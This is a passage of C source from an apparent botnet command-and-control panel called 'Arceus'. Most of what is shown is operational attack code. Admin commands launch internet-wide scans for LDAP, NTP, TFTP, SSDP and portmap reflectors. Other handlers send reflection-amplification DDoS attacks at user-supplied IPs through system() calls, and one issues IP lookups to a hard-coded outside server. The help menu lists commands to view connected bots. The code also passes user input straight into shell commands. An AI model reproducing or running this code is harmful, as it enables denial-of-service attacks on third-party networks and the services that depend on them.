                if(connect(Sock, (struct sockaddr *)&sock, sizeof(sock)) == -1) close(Sock); // If The Packet Returned, It Will Not Be Displayed
                else
                {        // If The Packet Returns From Handshake, The Port Is Open
                    snprintf(botnet, sizeof(botnet), "\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[38;5;202mPort\e[38;5;93m:[\e[38;5;202m%d\e[38;5;93m] \e[38;5;202mis open For IP\e[38;5;93m:[\e[38;5;202m%s\e[38;5;93m]\x1b[0m\r\n", x, host);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
                    memset(botnet, 0, sizeof(botnet)); // Fill In Data Block, Let's Keep Our Communication Stable
                    close(Sock); // Kill Our Open Socket - TCP
                }
            }                // Scan Is Done -- Output
            snprintf(botnet, sizeof(botnet), "\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[38;5;202mScan on IP\e[38;5;93m:[\e[38;5;202m%s\e[38;5;93m] \e[38;5;202mis Done!\x1b[0m\r\n", host);
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
/*
  ________  __          _____                    _            _ _                     
 |___  /  \/  |   /\   |  __ \                  | |     /\   | | |                    
    / /| \  / |  /  \  | |__) |   __ _ _ __   __| |    /  \  | | |_                   
   / / | |\/| | / /\ \ |  ___/   / _` | '_ \ / _` |   / /\ \ | | __|                  
  / /__| |  | |/ ____ \| |      | (_| | | | | (_| |  / ____ \| | |_                   
 /_____|_|  |_/_/    \_\_|       \__,_|_| |_|\__,_| /_/    \_\_|\__|                  
  ______      _                        _    _____                                     
 |  ____|    | |                      | |  / ____|                                    
 | |__  __  _| |_ ___ _ __ _ __   __ _| | | (___   ___ __ _ _ __  _ __   ___ _ __ ___ 
 |  __| \ \/ / __/ _ \ '__| '_ \ / _` | |  \___ \ / __/ _` | '_ \| '_ \ / _ \ '__/ __|
 | |____ >  <| ||  __/ |  | | | | (_| | |  ____) | (_| (_| | | | | | | |  __/ |  \__ \
 |______/_/\_\\__\___|_|  |_| |_|\__,_|_| |_____/ \___\__,_|_| |_|_| |_|\___|_|  |___/
 */
        if (strstr(buf, ".scan")) // System Command Function -- [TESTING HERE]
        {
      if(strcmp(admin, accounts[find_line].id) == 0) // Check If User Is Admin
        {
        char command[50];
        trim(command);
        strcpy(command, "python scan.py" );
        system(command);
        sprintf(botnet, "\e[38;5;93mStarting SSH Mass-Scan!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
      else
      {
        sprintf(botnet, "\e[38;5;93mOwners Only!!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
        }
/*
                      _____ _____  _    _ __  __                 
                     |_   _|  __ \| |  | |  \/  |                
                       | | | |__) | |__| | \  / |                
                       | | |  ___/|  __  | |\/| |                
                      _| |_| |    | |  | | |  | |                
                     |_____|_|    |_|  |_|_|  |_|                
                      / ____|                                    
                     | (___   ___ __ _ _ __  _ __   ___ _ __ ___ 
                      \___ \ / __/ _` | '_ \| '_ \ / _ \ '__/ __|
                      ____) | (_| (_| | | | | | | |  __/ |  \__ \
                     |_____/ \___\__,_|_| |_|_| |_|\___|_|  |___/
 */
        if (strstr(buf, ".lds on") || strstr(buf, ".LDS ON")) // System Command Function -- [TESTING HERE]
        {
      if(strcmp(admin, accounts[find_line].id) == 0) // Check If User Is Admin
        {
        char command[50];
        trim(command);
        strcpy(command, "./ldapscan 1.1.1.1 255.255.255.255 ldap.txt 2 1ms" );
        system(command);
        sprintf(botnet, "\e[38;5;93mStarting LDAP Mass-Scan!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
      else
      {
        sprintf(botnet, "\e[38;5;93mOwners Only!!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
        }
        if (strstr(buf, ".nts on") || strstr(buf, ".NTS ON")) // System Command Function -- [TESTING HERE]
        {
      if(strcmp(admin, accounts[find_line].id) == 0) // Check If User Is Admin
        {
        char command[50];
        trim(command);
        strcpy(command, "./ntpscan 1.1.1.1 255.255.255.255 ntp.txt 2 1ms" );
        system(command);
        sprintf(botnet, "\e[38;5;93mStarting NTP Mass-Scan!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
      else
      {
        sprintf(botnet, "\e[38;5;93mOwners Only!!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
        }
      if (strstr(buf, ".tfs on") || strstr(buf, ".TFS ON")) // System Command Function -- [TESTING HERE]
        {
      if(strcmp(admin, accounts[find_line].id) == 0) // Check If User Is Admin
        {
        char command[50];
        trim(command);
        strcpy(command, "./tftpscan 1.1.1.1 255.255.255.255 tftp.txt 2 1ms" );
        system(command);
        sprintf(botnet, "\e[38;5;93mStarting TFTP Mass-Scan!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
      else
      {
        sprintf(botnet, "\e[38;5;93mOwners Only!!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
        }
              if (strstr(buf, ".pos on") || strstr(buf, ".POS ON")) // System Command Function -- [TESTING HERE]
        {
      if(strcmp(admin, accounts[find_line].id) == 0) // Check If User Is Admin
        {
        char command[50];
        trim(command);
        strcpy(command, "./portmapscan 1.1.1.1 255.255.255.255 portmap.txt 2 1ms" );
        system(command);
        sprintf(botnet, "\e[38;5;93mStarting PORTMAP Mass-Scan!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
      else
      {
        sprintf(botnet, "\e[38;5;93mOwners Only!!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
        }
              if (strstr(buf, ".sds on") || strstr(buf, ".SDS ON")) // System Command Function -- [TESTING HERE]
        {
      if(strcmp(admin, accounts[find_line].id) == 0) // Check If User Is Admin
        {
        char command[50];
        trim(command);
        strcpy(command, "./ssdpscan 1.1.1.1 255.255.255.255 tftp.txt 2 1ms" );
        system(command);
        sprintf(botnet, "\e[38;5;93mStarting SSDP Mass-Scan!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
      else
      {
        sprintf(botnet, "\e[38;5;93mOwners Only!!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
        }
/*
                                   _____                       _             
                                  / ____|                     (_)            
                                 | (___   ___ __ _ _ __  _ __  _ _ __   __ _ 
                                  \___ \ / __/ _` | '_ \| '_ \| | '_ \ / _` |
                                  ____) | (_| (_| | | | | | | | | | | | (_| |
                                 |_____/_\___\__,_|_| |_|_| |_|_|_| |_|\__, |
                                    |  __ \                             __/ |
                                    | |__) | __ ___   ___ ___  ___ ___ |___/ 
                                    |  ___/ '__/ _ \ / __/ _ \/ __/ __|      
                                    | |   | | | (_) | (_|  __/\__ \__ \      
                                    |_|  _|_|__\___/ \___\___||___/___/      
                                        | |/ (_) | |                         
                                        | ' / _| | | ___ _ __ ___            
                                        |  < | | | |/ _ \ '__/ __|           
                                        | . \| | | |  __/ |  \__ \           
                                        |_|\_\_|_|_|\___|_|  |___/           
                                                                          
                                                            
*/
        if (strstr(buf, ".lds off") || strstr(buf, ".LDS OFF")) // System Command Function -- [TESTING HERE]
        {
      if(strcmp(admin, accounts[find_line].id) == 0) // Check If User Is Admin
        {
        char command[50];
        trim(command);
        strcpy(command, "pkill ldapscan" );
        system(command);
        sprintf(botnet, "\e[38;5;93mStopping LDAP MassScan\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
      else
      {
        sprintf(botnet, "\e[38;5;93mOwners Only!!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
        }
       if (strstr(buf, ".nts off") || strstr(buf, ".NTS OFF")) // System Command Function -- [TESTING HERE]
        {
      if(strcmp(admin, accounts[find_line].id) == 0) // Check If User Is Admin
        {
        char command[50];
        trim(command);
        strcpy(command, "pkill ntpscan" );
        system(command);
        sprintf(botnet, "\e[38;5;93mStopping NTP MassScan\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
      else
      {
        sprintf(botnet, "\e[38;5;93mOwners Only!!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
        }
               if (strstr(buf, ".tfs off") || strstr(buf, ".TFS OFF")) // System Command Function -- [TESTING HERE]
        {
      if(strcmp(admin, accounts[find_line].id) == 0) // Check If User Is Admin
        {
        char command[50];
        trim(command);
        strcpy(command, "pkill tftpscan" );
        system(command);
        sprintf(botnet, "\e[38;5;93mStopping TFTP MassScan\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
      else
      {
        sprintf(botnet, "\e[38;5;93mOwners Only!!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
        }
        if (strstr(buf, ".sds off") || strstr(buf, ".SDS OFF")) // System Command Function -- [TESTING HERE]
        {
        if(strcmp(admin, accounts[find_line].id) == 0) // Check If User Is Admin
        {
        char command[50];
        trim(command);
        strcpy(command, "pkill ssdpscan" );
        system(command);
        sprintf(botnet, "\e[38;5;93mStopping SSDP MassScan\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        else
        {
        sprintf(botnet, "\e[38;5;93mOwners Only!!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
        }
        if (strstr(buf, ".pos off") || strstr(buf, ".POS OFF")) // System Command Function -- [TESTING HERE]
        {
      if(strcmp(admin, accounts[find_line].id) == 0) // Check If User Is Admin
        {
        char command[50];
        trim(command);
        strcpy(command, "pkill portmapscan" );
        system(command);
        sprintf(botnet, "\e[38;5;93mStopping PORTMAP MassScan\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
      else
      {
        sprintf(botnet, "\e[38;5;93mOwners Only!!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
        }
/*
                              _____ _____  _    _ __  __            
                             |_   _|  __ \| |  | |  \/  |           
                               | | | |__) | |__| | \  / |           
                               | | |  ___/|  __  | |\/| |           
                              _| |_| |    | |  | | |  | |           
                             |_____|_|    |_| _|_|_|  |_|     _     
                             |  \/  |    | | | |             | |    
                             | \  / | ___| |_| |__   ___   __| |___ 
                             | |\/| |/ _ \ __| '_ \ / _ \ / _` / __|
                             | |  | |  __/ |_| | | | (_) | (_| \__ \
                             |_|  |_|\___|\__|_| |_|\___/ \__,_|___/
  */
       if (strstr(buf, ".ldap") || strstr(buf, ".LDAP")) // System Command Function
         {
        char iptarget[5000]; // Char Every Line For Output Communication
        char *token = strtok(buf, " "); // Create Delimiter
        snprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
        trim(iptarget); // Trim [iptarget]
        char *ipkill[5000]; // Creating A System Function
        trim(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./ldap %s 80 ldap.txt 2 -1 300", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 80
        system(ipkill); // System Execution
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!        \e[38;5;201m ║      ╔════════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod: LDAP        \e[38;5;201m ╠══════╣ \e[38;5;202m. STOP to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage: LDAP-IPHM    \e[38;5;201m ║      ╚════════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        if (strstr(buf, ".ban") || strstr(buf, ".BAN")) // System Command Function
         {
        char iptarget[5000]; // Char Every Line For Output Communication
        char *token = strtok(buf, " "); // Create Delimiter
        snprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
        trim(iptarget); // Trim [iptarget]
        char *ipkill[5000]; // Creating A System Function
        trim(ipkill); // Trim [ipkill]
        sprintf(ipkill, "iptables -A INPUT -s %s -j DROP", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 80
        system(ipkill); // System Execution
        sprintf(botnet, "\e[38;5;202mIP:\e[38;5;201m[\e[38;5;202m%s\e[38;5;201m] \e[38;5;202mBanned!\r\n", iptarget);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
               if (strstr(buf, ".ntp") || strstr(buf, ".NTP")) // System Command Function
         {
        char iptarget[5000]; // Char Every Line For Output Communication
        char *token = strtok(buf, " "); // Create Delimiter
        snprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
        trim(iptarget); // Trim [iptarget]
        char *ipkill[5000]; // Creating A System Function
        trim(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./ntp %s 80 ntp.txt 2 -1 300", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 80
        system(ipkill); // System Execution
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!        \e[38;5;201m ║      ╔════════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod: LDAP        \e[38;5;201m ╠══════╣ \e[38;5;202m. STOP to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage: LDAP-IPHM    \e[38;5;201m ║      ╚════════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        if (strstr(buf, ".ssdp") || strstr(buf, ".SSDP")) // System Command Function
         {
        char iptarget[5000]; // Char Every Line For Output Communication
        char *token = strtok(buf, " "); // Create Delimiter
        snprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
        trim(iptarget); // Trim [iptarget]
        char *ipkill[5000]; // Creating A System Function
        trim(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./ssdp %s 80 ldap.txt 2 -1 300", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 80
        system(ipkill); // System Execution
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!        \e[38;5;201m ║      ╔════════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod: LDAP        \e[38;5;201m ╠══════╣ \e[38;5;202m. STOP to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage: LDAP-IPHM    \e[38;5;201m ║      ╚════════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
      if (strstr(buf, ".tftp") || strstr(buf, ".TFTP")) // System Command Function
         {
        char iptarget[5000]; // Char Every Line For Output Communication
        char *token = strtok(buf, " "); // Create Delimiter
        snprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
        trim(iptarget); // Trim [iptarget]
        char *ipkill[5000]; // Creating A System Function
        trim(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./tftp %s 80 tftp.txt 2 -1 300", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 80
        system(ipkill); // System Execution
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!        \e[38;5;201m ║      ╔════════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod: LDAP        \e[38;5;201m ╠══════╣ \e[38;5;202m. STOP to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage: LDAP-IPHM    \e[38;5;201m ║      ╚════════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        if (strstr(buf, ".portmap") || strstr(buf, ".PORTMAP")) // System Command Function
         {
        char iptarget[5000]; // Char Every Line For Output Communication
        char *token = strtok(buf, " "); // Create Delimiter
        snprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
        trim(iptarget); // Trim [iptarget]
        char *ipkill[5000]; // Creating A System Function
        trim(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./ssdp %s 80 ldap.txt 2 -1 300", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 80
        system(ipkill); // System Execution
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!        \e[38;5;201m ║      ╔════════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod: LDAP        \e[38;5;201m ╠══════╣ \e[38;5;202m. STOP to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage: LDAP-IPHM    \e[38;5;201m ║      ╚════════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        /*
                      _____ _____  _    _ __  __   __  __      _   _               _ 
                     |_   _|  __ \| |  | |  \/  | |  \/  |    | | | |             | |
                       | | | |__) | |__| | \  / | | \  / | ___| |_| |__   ___   __| |
                       | | |  ___/|  __  | |\/| | | |\/| |/ _ \ __| '_ \ / _ \ / _` |
                      _| |_| |    | |  | | |  | | | |  | |  __/ |_| | | | (_) | (_| |
                     |_____|_|    |_|  |_|_|  |_| |_|  |_|\___|\__|_| |_|\___/ \__,_|
                     |  __ \                             | |/ (_) | |                
                     | |__) | __ ___   ___ ___  ___ ___  | ' / _| | | ___ _ __ ___   
                     |  ___/ '__/ _ \ / __/ _ \/ __/ __| |  < | | | |/ _ \ '__/ __|  
                     | |   | | | (_) | (_|  __/\__ \__ \ | . \| | | |  __/ |  \__ \  
                     |_|   |_|  \___/ \___\___||___/___/ |_|\_\_|_|_|\___|_|  |___/  

                                                                                       */
        else if (strstr(buf, ".KILL") || strstr(buf, ".kill")) // System Command Function -- [TESTING HERE]
        {        
        char command[50];
        trim(command);
        strcpy(command, "pkill ldap; pkill ntp; pkill ssdp; pkill tftp; pkill portmap" );
        system(command);
        sprintf(botnet, "\e[38;5;93mIPHM Based Processes Killed Succesfully!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
/*
                  _____ _____  _                 _                  _______          _ 
                 |_   _|  __ \| |               | |                |__   __|        | |
                   | | | |__) | |     ___   ___ | | ___   _ _ __      | | ___   ___ | |
                   | | |  ___/| |    / _ \ / _ \| |/ / | | | '_ \     | |/ _ \ / _ \| |
                  _| |_| |    | |___| (_) | (_) |   <| |_| | |_) |    | | (_) | (_) | |
                 |_____|_|    |______\___/ \___/|_|\_\\__,_| .__/     |_|\___/ \___/|_|
                                                           | |                         
                                                           |_|           

                                                                         */
        else if(strstr(buf, "iplookup") || strstr(buf, "IPLOOKUP"))
        {
            char myhost[20]; // Char Every Line For Output Communication
            char ki11[1024]; // Char Every Line For Output Communication // Ip Lookup Function
            snprintf(ki11, sizeof(ki11), "%s", buf); // Using Kill Prefix For Dynamic Integer
            trim(ki11); // Trim [ki11]
            char *token = strtok(ki11, " "); // Char Every Line For Output Communication
            snprintf(myhost, sizeof(myhost), "%s", token+strlen(token)+1); // Host Size Statement, This Is For OCMIS [PSL-0012]
            if(atoi(myhost) >= 8) // Bigger Than Int Value Of 8
            {
                int ret; // Create Integer For 'ret' -- Used In Each Value, For Time-Out Sequence
                int IPLSock = -1; // State IPLSOCK == -1 [Shouldn't Class With The Open Socket Via TCP]
                char iplbuffer[1024]; // Char Every Line For Output Communication
                int conn_port = 80; // Set Default Connection Port As [80]
                char iplheaders[1024]; // Char Every Line For Output Communication
                struct timeval timeout; // Create Struct. For Time Interval Timeout
                struct sockaddr_in sock; // Create Another Struct. For Socket-Address -> Socket
                char *iplookup_host = "185.244.25.189"; // Change to Server IP - [EDIT HERE]
                timeout.tv_sec = 4; // 4 second timeout
                timeout.tv_usec = 0; // 0 second -- Run Function
                IPLSock = socket(AF_INET, SOCK_STREAM, 0); // Running Socketstream, Using Set Values - We Are Concurrent
                sock.sin_family = AF_INET; // Socket Sin == Sin.family, Engages Better With Output Connection
                sock.sin_port = htons(conn_port); // htons, Is Dependent On The Connection Port -- Integer States Are Constant
                sock.sin_addr.s_addr = inet_addr(iplookup_host); // Coherent Connection - Will Kill Socket If Lookup Is Incomplete
                if(connect(IPLSock, (struct sockaddr *)&sock, sizeof(sock)) == -1) // Check Using IPLSock, If Connection Has Been Reached
                {
                    //printf("[\x1b[31m-\x1b[37m] Failed to connect to iplookup host server...\n");
                    sprintf(botnet, "\x1b[31m[IPLookup] Failed to connect to iplookup server...\x1b[0m\r\n", myhost);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                else // Else...
                {
                    //printf("[\x1b[32m+\x1b[37m] Connected to iplookup server :)\n");                This Below, Is Our Header Sent To The API, This Shouldn't Cause Problems..
                    snprintf(iplheaders, sizeof(iplheaders), "GET /iplookup.php?host=%s HTTP/1.1\r\nAccept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Encoding:gzip, deflate, sdch\r\nAccept-Language:en-US,en;q=0.8\r\nCache-Control:max-age=0\r\nConnection:keep-alive\r\nHost:%s\r\nUpgrade-Insecure-Requests:1\r\nUser-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36\r\n\r\n", myhost, iplookup_host);
                    if(send(IPLSock, iplheaders, strlen(iplheaders), 0))
                    {
                        //printf("[\x1b[32m+\x1b[37m] Sent request headers to iplookup api!\n");
                        sprintf(botnet, "\e[38;5;93m[\e[38;5;202mArceus\e[38;5;93m] \e[38;5;202mGathering Information On IP:\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m]\r\n", myhost); // IP Info -- Output
                        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                        char ch; // Char Every Line For Output Communication
                        int retrv = 0; // Create Integer For 'Retrv' -- [OPEN INT == 0]
                        uint32_t header_parser = 0; // Let's Create A Header Parse, Under 32-bit Unsigned Integer, This Allows Accurate Value Statement
                        while (header_parser != 0x0D0A0D0A) // Set Header Parse Value = '0x0D0A0D0A'
                        {
                            if ((retrv = read(IPLSock, &ch, 1)) != 1) // Check For Success, Using IPL Sock
                                break;
                
                            header_parser = (header_parser << 8) | ch; // Change Parser Value, Below '8'
                        }
                        memset(iplbuffer, 0, sizeof(iplbuffer)); // Fill Data Block, Stabilises On-going Process, Using Socket-Buffer
                        while(ret = read(IPLSock, iplbuffer, 1024)) // Set Ret, To Read -- Buffer Size Stated Coherently, [1024]
                        {
                            iplbuffer[ret] = '\0'; // Break, Below Is An Alternative If A Second Function Is Added
                            /*if(strlen(iplbuffer) > 1)
                                printf("\x1b[36m%s\x1b[37m\n", buffer);*/
                        }
                        //printf("%s\n", iplbuffer); <---- This Would Be Used, If No Error Handling Is Needed. The User Will Not Be Informed With DETAILS
                        if(strstr(iplbuffer, "<title>404")) // Use Header Title + Error 404 [Assumption Error = 404]
                        {
                            char iplookup_host_token[20]; // Char Every Line For Output Communication
                            sprintf(iplookup_host_token, "%s", iplookup_host); // %s Is Our Host Token, Set This As Our DISPLAY Variable
                            int ip_prefix = atoi(strtok(iplookup_host_token, ".")); // Create Integer For The IP Prefix, This Is Defined Using Our Received host_token
                            sprintf(botnet, "\x1b[31m[IPLookup] Failed, API can't be located on server %d.*.*.*:80\x1b[0m\r\n", ip_prefix); // Error Handling -- No API Was Found, Defined By Host Token
                            memset(iplookup_host_token, 0, sizeof(iplookup_host_token)); // Fill Data Block Again, We Do This For Every Function, To Stop Instability and Saturation
                        }
                        else if(strstr(iplbuffer, "nickers")) // Hehe.. ( ͡° ͜ʖ ͡°)
                            sprintf(botnet, "\x1b[31m[IPLookup] Failed, Hosting server needs to have php installed for api to work...\x1b[0m\r\n"); // Error Handling, Hosting Has No PHP.. 
                        else sprintf(botnet, "[+] \x1b[0m--- Results\x1b[0m --- [+]\r\n\x1b[0m%s\x1b[37m\r\n", iplbuffer); // Output Results, From IP Lookup
                        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast 
                    }
                    else
                    {
                        //printf("[\x1b[31m-\x1b[37m] Failed to send request headers...\n");
                        sprintf(botnet, "\x1b[31m[IPLookup] Failed to send request headers...\r\n"); // Header Send[ Failed -- Probably Due To Some Sort Of DDoS Protection, [Cloudflare, Blazing, Etc..]
                        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast 
                    }
                }
                close(IPLSock); // Terminate Allocated Statement, Open Socket, May Cause Numerous Network Problems If Not Killed...
            }
        }
/*
                                      _    _      _         __  __                  
                                     | |  | |    | |       |  \/  |                 
                                     | |__| | ___| |_ __   | \  / | ___ _ __  _   _ 
                                     |  __  |/ _ \ | '_ \  | |\/| |/ _ \ '_ \| | | |
                                     | |  | |  __/ | |_) | | |  | |  __/ | | | |_| |
                                     |_|  |_|\___|_| .__/  |_|  |_|\___|_| |_|\__,_|
                                                   | |                              
                                                   |_|    
*/
       if(strstr(buf, ".HELP") || strstr(buf, ".help") || strstr(buf, ".Help"))  // Help Command - Displays Help Menu
        {
        char help_cmd1 [5000]; // Char Every Line For Output Communication
        char help_cmd2 [5000]; // Char Every Line For Output Communication
        char help_cmd3 [5000]; // Char Every Line For Output Communication
        char help_cmd4 [5000]; // Char Every Line For Output Communication
        char help_cmd5 [5000]; // Char Every Line For Output Communication
        char help_cmd6 [5000]; // Char Every Line For Output Communication
        char help_cmd7 [5000]; // Char Every Line For Output Communication
        char help_cmd8 [5000]; // Char Every Line For Output Communication
        char help_cmd9 [5000]; // Char Every Line For Output Communication
        char help_cmd10 [5000]; // Char Every Line For Output Communication
        char help_cmd11 [5000]; // Char Every Line For Output Communication

        sprintf(help_cmd1,  "           \e[38;5;201m╔══════════════════════════════════════════════╗\r\n");
        sprintf(help_cmd2,  "           \e[38;5;201m║   \e[38;5;202mArceus I \e[38;5;201m-\e[38;5;202m Main Command List\e[38;5;201m - \e[38;5;202mExtra Cmds  \e[38;5;201m║\r\n"); // Display Menu - Help Menu
        sprintf(help_cmd3,  "           \e[38;5;201m╠══════════════════════════════════════════════╣\r\n"); // Display Menu - Help Menu
        sprintf(help_cmd4,  "           \e[38;5;201m║ \e[38;5;202m.stress \e[38;5;201m- \e[38;5;202mShows a list of available methods  \e[38;5;201m║\r\n"); // Display Menu - Help Menu
        sprintf(help_cmd5,  "           \e[38;5;201m║ \e[38;5;202m.clear \e[38;5;201m- \e[38;5;202mClears the Screen                   \e[38;5;201m║\r\n"); // Display Menu - Help Menu
        sprintf(help_cmd6,  "           \e[38;5;201m║ \e[38;5;202m.logout \e[38;5;201m- \e[38;5;202mLogs out, and closes the C2        \e[38;5;201m║\r\n"); // Display Menu - Help Menu
        sprintf(help_cmd7,  "           \e[38;5;201m║ \e[38;5;202m.bots \e[38;5;201m- \e[38;5;202mShows a list of connected devices    \e[38;5;201m║\r\n"); // Display Menu - Help Menu
        sprintf(help_cmd8,  "           \e[38;5;201m║ \e[38;5;202m.info \e[38;5;201m- \e[38;5;202mShows a list of user information     \e[38;5;201m║\r\n"); // Display Menu - Help Menu
